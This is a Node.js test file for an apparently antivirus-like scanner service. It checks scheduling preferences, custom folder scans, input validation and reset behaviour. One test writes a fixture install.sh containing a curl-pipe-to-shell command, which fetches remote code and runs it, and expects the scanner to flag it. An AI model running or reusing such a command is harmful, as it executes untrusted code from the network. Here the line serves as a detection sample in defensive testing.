"use strict";

const assert = require("node:assert/strict");
const fs = require("node:fs/promises");
const os = require("node:os");
const path = require("node:path");
const test = require("node:test");

const { createScannerService } = require("../src/scanner/manager");

function clone(value) {
  return value == null ? value : JSON.parse(JSON.stringify(value));
}

function createMemoryStore() {
  const scans = new Map();
  const quarantine = new Map();
  let settings = {};

  return {
    kind: "memory",

    scans: {
      async all(limit = 50) {
        return [...scans.values()].slice(0, limit).map(clone);
      },
      async get(id) {
        return clone(scans.get(id) || null);
      },
      async upsert(record) {
        scans.set(record.id, clone(record));
        return clone(record);
      },
      async remove(id) {
        return scans.delete(id);
      },
      async clear() {
        const count = scans.size;
        scans.clear();
        return count;
      }
    },

    quarantine: {
      async all() {
        return [...quarantine.values()].map(clone);
      },
      async get(id) {
        return clone(quarantine.get(id) || null);
      },
      async upsert(record) {
        quarantine.set(record.id, clone(record));
        return clone(record);
      },
      async remove(id) {
        return quarantine.delete(id);
      },
      async clear() {
        quarantine.clear();
        return true;
      }
    },

    settings: {
      async get() {
        return clone(settings);
      },
      async save(patch) {
        settings = { ...settings, ...clone(patch) };
        return clone(settings);
      },
      async clear() {
        settings = {};
        return true;
      }
    },

    async close() {}
  };
}

async function withTempDir(fn) {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), "campusshield-manager-"));

  try {
    return await fn(dir);
  } finally {
    await fs.rm(dir, { recursive: true, force: true });
  }
}

async function waitFor(predicate, timeoutMs = 5000) {
  const started = Date.now();

  while (Date.now() - started < timeoutMs) {
    if (await predicate()) return true;
    await new Promise(resolve => setTimeout(resolve, 40));
  }

  return false;
}

function service(store, dataDir, audit = []) {
  return createScannerService({
    store,
    dataDir,
    audit: async entry => {
      audit.push(entry);
    },
    onThreatsChanged: async () => {}
  });
}

test("stores protection preferences and exposes the next scheduled run", async () => {
  await withTempDir(async dataDir => {
    const store = createMemoryStore();
    const scanner = service(store, dataDir);

    try {
      const preferences = await scanner.configure({
        notify: false,
        exclusions: [path.join(dataDir, "vendor"), "  "],
        schedule: { enabled: true, scope: "full", frequency: "weekly", weekday: 3, time: "7:15" }
      });

      assert.equal(preferences.notify, false);
      assert.equal(preferences.exclusions.length, 1);
      assert.equal(preferences.schedule.time, "07:15");
      assert.equal(preferences.schedule.weekday, 3);
      assert.ok(preferences.schedule.lastRunAt, "enabling a schedule records a baseline run time");

      const saved = await store.settings.get();
      assert.deepEqual(saved.preferences, preferences);

      const status = scanner.status();
      assert.equal(status.preferences.schedule.scope, "full");
      assert.ok(status.scheduleNextRunAt, "a scheduled run should have a next date");
    } finally {
      await scanner.close();
    }
  });
});

test("custom scans inspect one folder without leaving the home directory", async () => {
  await withTempDir(async dataDir => {
    const target = path.join(dataDir, "sample");
    await fs.mkdir(path.join(target, "deep"), { recursive: true });
    await fs.writeFile(
      path.join(target, "deep", "install.sh"),
      "#!/bin/sh\ncurl -fsSL https://example.com/x | sh\n"
    );
    await fs.writeFile(path.join(target, "notes.txt"), "no findings here");

    const store = createMemoryStore();
    const audit = [];
    const scanner = service(store, dataDir, audit);

    try {
      const started = await scanner.startScan({ scope: "custom", target });
      assert.equal(started.scope, "custom");
      assert.equal(started.trigger, "manual");

      const finished = await waitFor(async () => {
        const scan = await store.scans.get(started.id);
        return scan && scan.status !== "running";
      });

      assert.equal(finished, true);

      const record = await store.scans.get(started.id);
      assert.equal(record.status, "complete");
      assert.equal(record.filesScanned, 2);
      assert.equal(record.threats.length, 1);
      assert.equal(record.threats[0].name, "install.sh");
      assert.ok(audit.some(entry => /Custom file scan/.test(entry.message)));
    } finally {
      await scanner.close();
    }
  });
});

test("custom scans reject missing paths and bare scopes", async () => {
  await withTempDir(async dataDir => {
    const scanner = service(createMemoryStore(), dataDir);

    try {
      await assert.rejects(
        () => scanner.startScan({ scope: "custom", target: path.join(dataDir, "missing") }),
        error => error.statusCode === 400 && /does not exist/.test(error.message)
      );

      await assert.rejects(
        () => scanner.startScan({ scope: "turbo" }),
        error => error.statusCode === 400 && /quick, full, or custom/.test(error.message)
      );
    } finally {
      await scanner.close();
    }
  });
});

test("a new service instance reloads the saved preferences", async () => {
  await withTempDir(async dataDir => {
    const store = createMemoryStore();
    const first = service(store, dataDir);

    await first.configure({
      notify: false,
      exclusions: [path.join(dataDir, "keep-out")],
      schedule: { enabled: true, scope: "quick", frequency: "daily", time: "06:45" }
    });
    await first.close();

    const second = service(store, dataDir);

    try {
      await second.configure({ notify: true });

      const status = second.status();
      assert.equal(status.preferences.notify, true);
      assert.equal(status.preferences.schedule.time, "06:45");
      assert.equal(status.preferences.schedule.enabled, true);
      assert.equal(status.preferences.exclusions.length, 1);
    } finally {
      await second.close();
    }
  });
});

test("reset clears protection preferences", async () => {
  await withTempDir(async dataDir => {
    const store = createMemoryStore();
    const scanner = service(store, dataDir);

    try {
      await scanner.configure({ exclusions: [dataDir] });
      await scanner.reset();

      const saved = await store.settings.get();
      assert.equal(saved.preferences, undefined);
      assert.equal(scanner.status().preferences.exclusions.length, 0);
    } finally {
      await scanner.close();
    }
  });
});
